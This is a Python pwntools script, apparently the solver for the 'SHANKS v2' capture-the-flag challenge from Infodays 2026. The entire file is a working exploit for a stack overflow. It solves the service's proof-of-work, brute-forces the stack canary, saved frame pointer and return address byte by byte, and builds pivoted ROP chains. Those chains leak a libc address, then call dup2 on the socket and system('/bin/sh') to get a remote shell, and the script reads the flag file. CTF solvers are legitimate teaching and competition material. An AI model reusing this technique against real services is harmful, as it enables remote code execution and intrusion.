#!/usr/bin/env python3
"""
SHANKS v2 — end-to-end solver (Infodays 2026 CTF, author: saamnolimits).

Usage:  solve.py HOST PORT [--local /path/to/shanks_v2]

Wire protocol (invented for this challenge — no training data online):

    Frame := 4-byte magic | 2-byte big-endian length | length bytes

    PW01 (server -> client):   8-byte challenge || 1-byte difficulty
    PW01 (client -> server):   8-byte nonce            where
                               leading_zero_bits(sha256(challenge||nonce))
                                     >= difficulty
    CAP1 (server -> client):   "Captain: "
    CAP1 (client -> server):   up to 0x440 payload bytes (the overflow)
    CAP1 (server -> client):   "Captain found!\\n" if check passed

Anti-automation: every connection requires solving a 16-bit PoW before
the overflow primitive is exposed.  The 2000-ish connections the byte
oracle needs translate to ~60 seconds of PoW compute — light enough
for a purpose-built solver, heavy enough to block zero-code attempts.
"""
import argparse
import hashlib
import re
import secrets
import struct
import subprocess
import time

from pwn import ELF, ROP, context, log, p64, remote, u64

context.arch = 'amd64'
context.log_level = 'warn'

KEY = 0x0d
USERNAME_WIRE = b'shanks'

POW_MAGIC  = b'PW01'
CAP_MAGIC  = b'CAP1'
POW_FAIL   = b'PWNO'


def xor(buf: bytes, key: int = KEY) -> bytes:
    return bytes(b ^ key for b in buf)


# ── wire-protocol helpers ───────────────────────────────────────────

def frame(magic: bytes, payload: bytes) -> bytes:
    if len(magic) != 4:
        raise ValueError("magic must be 4 bytes")
    if len(payload) > 0xffff:
        raise ValueError("payload too long")
    return magic + struct.pack('>H', len(payload)) + payload


def recv_frame(io, expect_magic: bytes, timeout: float = 5) -> bytes:
    hdr = io.recvn(6, timeout=timeout)
    if len(hdr) != 6:
        raise EOFError("short frame header")
    if hdr[:4] != expect_magic:
        raise ValueError(f"expected magic {expect_magic!r}, got {hdr[:4]!r}")
    (length,) = struct.unpack('>H', hdr[4:6])
    body = io.recvn(length, timeout=timeout) if length else b''
    if len(body) != length:
        raise EOFError("short frame body")
    return body


def solve_pow(challenge: bytes, difficulty: int) -> bytes:
    """Find an 8-byte nonce with sha256(challenge||nonce) >= difficulty
    leading zero bits.  Runs in pure Python — at difficulty 16 this is
    ~30ms on modern hardware."""
    need_full_bytes = difficulty // 8
    need_extra_bits = difficulty % 8
    mask_partial = (0xff << (8 - need_extra_bits)) & 0xff if need_extra_bits else 0
    full_prefix = b'\x00' * need_full_bytes

    # counter-based nonce is fine: PoW only validates hash prefix
    for n in range(1 << 40):
        nonce = n.to_bytes(8, 'big')
        d = hashlib.sha256(challenge + nonce).digest()
        if d[:need_full_bytes] != full_prefix:
            continue
        if need_extra_bits and (d[need_full_bytes] & mask_partial) != 0:
            continue
        return nonce
    raise RuntimeError("PoW search exhausted (shouldn't happen)")


def handshake(io):
    """Do the PoW handshake and swallow the Captain: frame.  Leaves the
    socket ready for the attacker's CAP1 payload."""
    pow_body = recv_frame(io, POW_MAGIC)
    challenge = pow_body[:8]
    difficulty = pow_body[8]
    nonce = solve_pow(challenge, difficulty)
    io.send(frame(POW_MAGIC, nonce))

    # Server now sends CAP1 "Captain: " prompt before reading.
    captain = recv_frame(io, CAP_MAGIC)
    if captain != b'Captain: ':
        raise RuntimeError(f"unexpected captain prompt: {captain!r}")


def send_captain_frame(io, payload: bytes):
    io.send(frame(CAP_MAGIC, payload))


# ── disassembler-driven offset recovery (unchanged from v1) ─────────

def disassemble(elf_path: str):
    text = subprocess.check_output(
        ['objdump', '-M', 'intel', '-d', elf_path]).decode(errors='ignore')
    return text, text.splitlines()


def find_check_username(lines):
    for i, ln in enumerate(lines):
        if re.search(r'cmp\s+WORD PTR \[rbp-.+\],0x440', ln) or \
           re.search(r'mov\s+eax,0x440', ln) or \
           re.search(r'\$0x440', ln):
            start_i = i
            while start_i > 0 and 'push   rbp' not in lines[start_i]:
                start_i -= 1
            end_i = i
            while end_i < len(lines) and not lines[end_i].strip().endswith('ret'):
                end_i += 1
            pc_match = re.match(r'\s*([0-9a-f]+):', lines[start_i])
            start_pc = int(pc_match.group(1), 16) if pc_match else 0
            return start_pc, lines[start_i:end_i + 1]
    raise RuntimeError('check_username not found (no 0x440 constant)')


def find_lea_rbp_buf(fn_lines):
    for i, ln in enumerate(fn_lines):
        if re.search(r'call\s+\S+\s+<read@plt>', ln):
            for j in range(i - 1, max(-1, i - 10), -1):
                m = re.search(r'lea\s+rsi,\[rbp-0x([0-9a-f]+)\]', fn_lines[j])
                if m:
                    return int(m.group(1), 16)
    raise RuntimeError('could not find `lea rsi, [rbp - X]` for buf')


def find_canary_offset(fn_lines) -> int:
    for ln in fn_lines[:30]:
        m = re.search(r'mov\s+QWORD PTR \[rbp-0x([0-9a-f]+)\],rax', ln)
        if m:
            return int(m.group(1), 16)
    raise RuntimeError('could not find canary store')


def find_saved_reg_count(fn_lines) -> int:
    pushes = 0
    saw_mov_rbp = False
    for ln in fn_lines[:15]:
        if 'mov    rbp,rsp' in ln:
            saw_mov_rbp = True
            continue
        if saw_mov_rbp and re.search(r'push\s+r(b[xp]|1[0-5]|[12345])\b', ln):
            pushes += 1
        if 'sub    rsp' in ln:
            break
    return pushes


def find_main_callsite(elf_path: str, check_username_pc: int) -> int:
    text, lines = disassemble(elf_path)
    for i, ln in enumerate(lines):
        m = re.search(r'call\s+([0-9a-f]+)\b', ln)
        if m and int(m.group(1), 16) == check_username_pc:
            m2 = re.match(r'\s*([0-9a-f]+):', lines[i + 1])
            if m2:
                return int(m2.group(1), 16)
    raise RuntimeError('no call to check_username found in .text')


# ── fork-oracle canary / rbp / ret brute force, now PoW-aware ───────

class Oracle:
    def __init__(self, host: str, port: int):
        self.host, self.port = host, port

    def probe(self, payload: bytes, marker=b'Captain found!') -> bool:
        try:
            io = remote(self.host, self.port, timeout=8)
        except Exception:
            return False
        try:
            handshake(io)
            send_captain_frame(io, payload)
            got = b''
            try:
                hdr = io.recvn(6, timeout=2)
                if len(hdr) == 6 and hdr[:4] == CAP_MAGIC:
                    (ln,) = struct.unpack('>H', hdr[4:6])
                    got = io.recvn(ln, timeout=2)
            except Exception:
                pass
            return marker in got
        except Exception:
            return False
        finally:
            try: io.close()
            except Exception: pass

    def brute_word(self, prefix: bytes, label: str, hint_byte=None,
                   byte0_candidates=None) -> bytes:
        got = b''
        t0 = time.time()
        while len(got) < 8:
            if hint_byte is not None and len(got) == 0:
                got += bytes([hint_byte])
                continue
            if byte0_candidates is not None and len(got) == 0:
                candidates = byte0_candidates
            else:
                candidates = range(256)
            for guess in candidates:
                if self.probe(prefix + got + bytes([guess])):
                    got += bytes([guess])
                    break
            else:
                raise RuntimeError(f'{label} byte {len(got)} exhausted')
        log.warn(f'{label} = {got.hex()}  ({time.time()-t0:.1f}s)')
        return got


def exploit(host: str, port: int, elf_path: str):
    elf = ELF(elf_path)
    rop = ROP(elf)

    pop_rdi  = rop.find_gadget(['pop rdi', 'ret']).address
    pop_rsi  = rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address
    pop_rdx  = next(a for a in elf.search(b'\x5a\xc3', executable=True))
    leave_r  = next(a for a in elf.search(b'\xc9\xc3', executable=True))
    write_plt = elf.plt['write']
    write_got = elf.got['write']

    text, lines = disassemble(elf_path)
    cu_pc, cu_body = find_check_username(lines)
    rbp_to_buf      = find_lea_rbp_buf(cu_body)
    canary_off      = find_canary_offset(cu_body)
    preserved_pushs = find_saved_reg_count(cu_body)
    ret_offset      = find_main_callsite(elf_path, cu_pc)

    log.warn(f'check_username @ elf+{hex(cu_pc)}')
    log.warn(f'buf at rbp-{hex(rbp_to_buf)}')
    log.warn(f'canary at rbp-{hex(canary_off)}')
    log.warn(f'preserved reg pushes after rbp: {preserved_pushs}')

    fill_len      = rbp_to_buf - canary_off
    gap_to_rbp    = (canary_off - 8)
    rbp_offset    = fill_len + 8 + gap_to_rbp

    ora = Oracle(host, port)
    prefix_canary = USERNAME_WIRE + b'A' * (fill_len - len(USERNAME_WIRE))

    sockfd = 4
    gap_unused = b'A' * (rbp_offset - (fill_len + 8) - 8 * preserved_pushs)
    rbx_plant = xor(p64(sockfd))
    rbx_filler = rbx_plant * preserved_pushs

    import os
    cache = os.environ.get('SHANKS_LEAK_CACHE', '')
    parts = cache.split(':') if cache else []
    have = [len(parts) > i and parts[i] for i in range(3)]

    xor_canary = (bytes.fromhex(parts[0]) if have[0]
                  else ora.brute_word(prefix_canary, 'xor_canary', hint_byte=0x0d))
    prefix_rbp = prefix_canary + xor_canary + gap_unused + rbx_filler
    rbp_b0 = [i ^ KEY for i in range(0, 256, 16)]
    xor_saved_rbp = (bytes.fromhex(parts[1]) if have[1]
                     else ora.brute_word(prefix_rbp, 'xor_saved_rbp', byte0_candidates=rbp_b0))
    xor_ret = (bytes.fromhex(parts[2]) if have[2]
               else ora.brute_word(prefix_rbp + xor_saved_rbp, 'xor_ret'))
    log.warn(f'SHANKS_LEAK_CACHE={xor_canary.hex()}:{xor_saved_rbp.hex()}:{xor_ret.hex()}')

    canary    = u64(xor(xor_canary).ljust(8, b'\x00'))
    saved_rbp = u64(xor(xor_saved_rbp).ljust(8, b'\x00'))
    ret_addr  = u64(xor(xor_ret).ljust(8, b'\x00'))

    elf_base = None
    for delta in (0, 2, -2, 4, -4, 6, -6):
        candidate = ret_addr - (ret_offset + delta)
        if (candidate & 0xfff) == 0:
            elf_base = candidate
            break
    if elf_base is None:
        raise RuntimeError(f'no page-aligned ELF base near ret_offset={hex(ret_offset)}')

    log.success(f'canary    = {hex(canary)}')
    log.success(f'saved rbp = {hex(saved_rbp)}')
    log.success(f'saved ret = {hex(ret_addr)}')
    log.success(f'ELF base  = {hex(elf_base)}')

    pop_rdi_a   = elf_base + pop_rdi
    pop_rsi_a   = elf_base + pop_rsi
    pop_rdx_a   = elf_base + pop_rdx
    leave_a     = elf_base + leave_r
    write_plt_a = elf_base + write_plt
    write_got_a = elf_base + write_got
    cu_a        = elf_base + cu_pc

    pivot_delta_s1 = rbp_to_buf + 0x80 + 2
    CHAIN1_CU_OFFSET = 86
    CHAIN2_START_OFFSET = 10
    pivot_delta_s2 = (2 * rbp_to_buf - CHAIN1_CU_OFFSET + 0x80
                      - (CHAIN2_START_OFFSET - 8))

    chain1 = b''
    chain1 += p64(pop_rdi_a) + p64(sockfd)
    chain1 += p64(pop_rsi_a) + p64(write_got_a) + p64(0)
    chain1 += p64(pop_rdx_a) + p64(8)
    chain1 += p64(write_plt_a)
    chain1 += p64(pop_rdi_a) + p64(sockfd)
    chain1 += p64(cu_a)

    payload  = USERNAME_WIRE
    payload += xor(chain1)
    assert len(USERNAME_WIRE) + len(chain1) - 8 == CHAIN1_CU_OFFSET
    payload += b'A' * (fill_len - len(payload))
    payload += xor_canary
    payload += gap_unused + rbx_filler
    payload += xor(p64(saved_rbp - pivot_delta_s1))
    payload += xor(p64(leave_a))
    payload += b'\x00' * (0x440 - len(payload))

    io = remote(host, port)
    handshake(io)
    send_captain_frame(io, payload)

    # Stage-1 chain writes 8 raw leak bytes first, then re-enters
    # check_username which writes a CAP1 frame for "Captain: ".
    # Our written write(sockfd, write@got, 8) is NOT framed — it's
    # an 8-byte leak emitted in the middle of the protocol, so we
    # read 8 raw bytes directly before parsing the next frame.
    write_leak = u64(io.recvn(8, timeout=5).ljust(8, b'\x00'))
    log.success(f'libc.write = {hex(write_leak)}')

    candidates = [
        ('glibc 2.35-0ubuntu3.13 (Ubuntu 22.04)',
         {'write': 0x1148f0, 'dup2': 0x115090,
          'system': 0x50d70, 'binsh': 0x1d8678}),
        ('glibc 2.35 (Ubuntu 22.04, packaged 2.35-0ubuntu3.x)',
         {'write': 0x1143b0, 'dup2': 0x10cea0,
          'system': 0x50d70, 'binsh': 0x1d8678}),
    ]
    libc_base = None
    offsets = None
    for name, off in candidates:
        base = write_leak - off['write']
        if (base & 0xfff) == 0:
            libc_base = base
            offsets = off
            log.success(f'{name}: libc base = {hex(base)}')
            break
    if libc_base is None:
        raise RuntimeError(f'libc not matched. leaked write = {hex(write_leak)}')

    dup2_a   = libc_base + offsets['dup2']
    system_a = libc_base + offsets['system']
    binsh_a  = libc_base + offsets['binsh']

    chain2 = b''
    for fd_i in (0, 1, 2):
        chain2 += p64(pop_rdi_a) + p64(sockfd)
        chain2 += p64(pop_rsi_a) + p64(fd_i) + p64(0)
        chain2 += p64(dup2_a)
    chain2 += p64(pop_rdi_a) + p64(binsh_a) + p64(system_a)

    pad2 = b'\x00' * (CHAIN2_START_OFFSET - len(USERNAME_WIRE))
    payload2  = USERNAME_WIRE + pad2
    payload2 += xor(chain2)
    payload2 += b'A' * (fill_len - len(payload2))
    payload2 += xor_canary
    payload2 += gap_unused + rbx_filler
    payload2 += xor(p64(saved_rbp - pivot_delta_s2))
    payload2 += xor(p64(leave_a))
    payload2 += b'\x00' * (0x440 - len(payload2))

    # Consume the CAP1 "Captain: " frame the re-entered check_username
    # just emitted.
    _ = recv_frame(io, CAP_MAGIC)
    send_captain_frame(io, payload2)

    io.sendline(b'cat /home/ctf/flag.txt; echo')
    flag = io.recvuntil(b'}', timeout=5)
    m = re.search(rb'(infodays\{[^}]*\})', flag)
    print(m.group(1).decode() if m else flag.decode(errors='replace'))
    io.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('host')
    ap.add_argument('port', type=int)
    ap.add_argument('--local', default='/tmp/shanks_v2.bin')
    args = ap.parse_args()
    exploit(args.host, args.port, args.local)


if __name__ == '__main__':
    main()
